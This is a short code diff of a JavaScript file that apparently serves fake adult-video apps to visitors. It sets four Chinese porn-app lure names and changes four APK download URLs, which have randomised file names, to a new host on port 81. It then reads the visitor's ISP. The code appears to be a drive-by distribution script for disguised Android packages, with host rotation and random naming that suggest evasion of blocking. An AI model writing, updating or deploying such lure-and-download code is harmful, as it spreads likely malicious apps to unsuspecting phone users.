@@ -2,10 +2,10 @@ var name="夜色A片";
 var name2="360影视A片";
 var name3="PPTV聚色A片";
 var name4="极品视频";
-var url="http://cdn3.jinhuashenghuo.com/a71-" + randomString(10) + ".apk";
-var url2="http://cdn3.jinhuashenghuo.com/a72-" + randomString(10) + ".apk";
-var url3="http://cdn3.jinhuashenghuo.com/a73-" + randomString(10) + ".apk";
-var url4="http://cdn3.jinhuashenghuo.com/a74-" + randomString(10) + ".apk";
+var url="http://down.hualianintledu.cn:81/a71-" + randomString(10) + ".apk";
+var url2="http://down.hualianintledu.cn:81/a72-" + randomString(10) + ".apk";
+var url3="http://down.hualianintledu.cn:81/a73-" + randomString(10) + ".apk";
+var url4="http://down.hualianintledu.cn:81/a74-" + randomString(10) + ".apk";
 
 try{
 	var isp=remote_ip_info.isp;
